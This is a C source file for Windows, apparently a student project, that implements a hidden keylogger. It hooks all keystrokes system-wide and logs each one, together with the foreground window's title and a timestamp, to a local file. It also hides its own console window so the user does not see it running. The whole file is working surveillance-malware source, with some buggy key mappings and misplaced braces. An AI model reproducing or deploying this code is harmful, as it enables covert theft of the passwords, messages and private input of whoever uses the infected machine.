#include<windows.h>
#include<time.h>



HANDLE hIn;
char lastwindow[256];


void log(char s1[]){


    char s2[]={'       ','[','W','I','N','D','O','W',' ',':'};
    char s3[]={']','\n'};
    if(hIn!=INVALID_HANDLE_VALUE){

    HWND foreground = GetForegroundWindow();
    if (foreground)
    {
        char window_title[256];
        GetWindowText(foreground, window_title, 256);

        if(strcmp(window_title, lastwindow)!=0) {
            strcpy(lastwindow, window_title);

            // get time
            time_t t = time(NULL);
            struct tm *tm = localtime(&t);
            char s[64];
            strftime(s, sizeof(s), "%c", tm);

            DWORD nIn3=strlen(s2),nOut3=0;
            WriteFile(hIn,s2,nIn3,&nOut3,NULL);

            DWORD nIn1=strlen(s),nOut1=0;
            DWORD nIn2=strlen(window_title),nOut2=0;
            DWORD nIn4=strlen(s3),nOut4=0;

            WriteFile(hIn,window_title,nIn2,&nOut2,NULL);
            WriteFile(hIn,s,nIn1,&nOut1,NULL);
            WriteFile(hIn,s3,nIn4,&nOut4,NULL);
            //fprintf(OUTPUT_FILE, "- at %s] ", s);
        }
    }

        DWORD nIn=strlen(s1),nOut=0;

        WriteFile(hIn,s1,nIn,&nOut,NULL);


    }
}

int isCapsLock(){

    return (GetKeyState(VK_CAPITAL) & 0x0001);
}


LRESULT CALLBACK LowLevelKeyboardProc(int nCode,WPARAM wParam, LPARAM lParam){



    KBDLLHOOKSTRUCT *pKeyBoard=(KBDLLHOOKSTRUCT *)lParam;
    char val[5];
    DWORD dwMsg=1;
    switch(wParam){

    case WM_KEYDOWN:

    {



        DWORD vkCode = (*pKeyBoard ).vkCode;
        if((vkCode>=39) && (vkCode <=64)){

            if(GetAsyncKeyState(VK_SHIFT)){

                switch(vkCode){

                case 0x30:
                    log(")");
                    break;

                case 0x31:
                    log("!");
                    break;
                case 0x32:
                    log("@");
                    break;
                case 0x33:
                    log("#");
                    break;
                case 0x34:
                    log("$");
                    break;
                case 0x35:
                    log("%");
                    break;
                case 0x36:
                    log("^");
                    break;
                case 0x37:
                    log("&");
                    break;
                case 0x38:
                    log("*");
                    break;
                case 0x39:
                    log("(");
                    break;

                }
            }
            else {
                sprintf(val,"%c",vkCode);
                log(val);

            }

        }
        else if(vkCode>64 && vkCode<91){

            if(!(GetAsyncKeyState(VK_SHIFT)^ isCapsLock()))
            {
                vkCode += 32;
            }
            sprintf(val,"%c",vkCode);
            log(val);

        }
        else {

            switch(vkCode){

            case VK_CANCEL:
                log("[CANCEL]");
                break;
            case VK_SPACE:
                log(" ");
                break;
            case VK_LCONTROL:
                log("[LCtrl]");
                break;
            case VK_RCONTROL:
                log("[RCtrl]");
                break;
            case VK_RMENU:
                log("[RAlt]");
                break;
            case VK_LWIN:
                log("[LWindows]");
                break;
            case VK_RWIN:
                log("RWindows");
                break;
            case VK_APPS:
                log("Applications");
                break;
            case VK_SNAPSHOT:
                log("[PrintScreen]");
                break;
            case VK_INSERT:
                log("[Insert]");
                break;
            case VK_PAUSE:
                log("[Pause]");
                break;
            case VK_SELECT:
                log("[Select]");
                break;
            case VK_HELP:
                log("[Help]");
                break;
            case VK_EXECUTE:
                log("[Execute]");
                break;
            case VK_DELETE:
                log("[Delete]");
                break;
            case VK_CLEAR:
                log("[Clear]");
                break;
            case VK_RETURN:
                log("[Enter]");
                break;
            case VK_BACK:
                log("[Backspace]");
                break;
            case VK_TAB:
                log("[Tab]");
                break;
            case VK_ESCAPE:
                log("[Escape]");
                break;
            case VK_LSHIFT:
                log("[LShift]");
                break;
            case VK_RSHIFT:
                log("[RShift]");
                break;
            case VK_CAPITAL:
                log("[Capital]");
                break;
            case VK_NUMLOCK:
                log("[NumLock]");
                break;
            case VK_SCROLL:
                log("[Scroll]");
                break;
            case VK_HOME:
                log("[Home]");
                break;
            case VK_END:
                log("[End]");
                break;
            case VK_DIVIDE:
                log("[/]");
                break;
            case VK_MULTIPLY:
                log("[*]");
                break;
            case VK_ADD:
                log("[+]");
                break;
            case VK_PRIOR:
                log("[PageUp]");
                break;
            case VK_NEXT:
                log("[PageDown]");
                break;
            case VK_LEFT:
                log("[Left]");
                break;
            case VK_RIGHT:
                log("[Right]");
                break;
            case VK_UP:
                log("[Up]");
                break;
            case VK_NUMPAD0:
                log("[0]");
                break;
            case VK_NUMPAD1:
                log("[1]");
                break;
            case VK_NUMPAD2:
                log("[2]");
                break;
            case VK_NUMPAD3:
                log("[3]");
                break;
            case VK_NUMPAD4:
                log("[4]");
                break;
            case VK_NUMPAD5:
                log("[5]");
                break;
            case VK_NUMPAD6:
                log("[6]");
                break;
            case VK_NUMPAD7:
                log("[7]");
                break;
            case VK_NUMPAD8:
                log("[8]");
                break;
            case VK_NUMPAD9:
                log("[9]");
                break;
            case VK_F1:
                log("[F1]");
                break;
            case VK_F2:
                log("[F2]");
                break;

            case VK_F3:
                log("[F3]");
                break;
            case VK_F4:
                log("[F4]");
                break;
            case VK_F5:
                log("[F5]");
                break;
            case VK_F6:
                log("[F6]");
                break;
            case VK_F7:
                log("[F7]");
                break;
            case VK_F8:
                log("[F8]");
                break;
            case VK_F9:
                log("[F9]");
                break;
            case VK_F10:
                log("[F10]");
                break;
            case VK_F11:
                log("[F11]");
                break;
            case VK_F12:
                log("[F12]");
                break;
            case VK_OEM_2:
                if(GetAsyncKeyState(VK_SHIFT))
                    log("?");
                else log("/");
                break;
            case VK_OEM_3:
                if(GetAsyncKeyState(VK_SHIFT))
                    log("~");
                else
                    log("`");
                    break;
            case VK_OEM_4:
                if(GetAsyncKeyState(VK_SHIFT))
                    log("{");
                else log("[");
                break;
            case VK_OEM_5:
                if(GetAsyncKeyState(VK_SHIFT))
                    log("|");
                else log("\\");
                break;

            case VK_OEM_6:
                if(GetAsyncKeyState(VK_SHIFT))
                    log("}");
                else log("]");
                break;
            case VK_OEM_7:
                if(GetAsyncKeyState(VK_SHIFT))
                    log("\\");
                else log("'");
                break;
            case 0xBC:
                if(GetAsyncKeyState(VK_SHIFT))
                    log("<");
                else log(",");
                break;
            case 0xBE:
                if(GetAsyncKeyState(VK_SHIFT))
                    log(">");
                else
                    log(".");
                    break;
            case 0xBA:
                if(GetAsyncKeyState(VK_SHIFT))
                    log(":");
                else log(";");
                break;
            case 0xBD:
                if(GetAsyncKeyState(VK_SHIFT))
                    log("_");
                else log("-");
                break;
            case 0xBB:
                if(GetAsyncKeyState(VK_SHIFT))
                    log("+");
                else
                    log("=");
            default:
                dwMsg+=pKeyBoard->scanCode<< 16;
                dwMsg+=pKeyBoard->flags<<24;

                char key[16];

                GetKeyNameText(dwMsg,key,15);
                log(key);


            }

        }
        break;

    }
    return CallNextHookEx(NULL,nCode,wParam,lParam);

}
return 0;
}


void KL(){

    hIn=CreateFile("C:\\Users\\hee yaa\\Desktop\\GitHub\\spl1\\keylogger\\keys.log",GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);

    HHOOK hKeyHook;

    HINSTANCE hExe=GetModuleHandle(NULL);
    if(hExe!=INVALID_HANDLE_VALUE){

        //req from OS hook keyboard, call f1

        SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)LowLevelKeyboardProc ,hExe,0);
        MSG msg;
        while(GetMessage(&msg,NULL,0,0)!=0);

    }

}

void Stealth()
{
 HWND Stealth;
 AllocConsole();
 Stealth = FindWindowA("ConsoleWindowClass", NULL);
 ShowWindow(Stealth,0);
}

void  main(int argc,LPTSTR argv[])
{
    Stealth();
    KL();

}

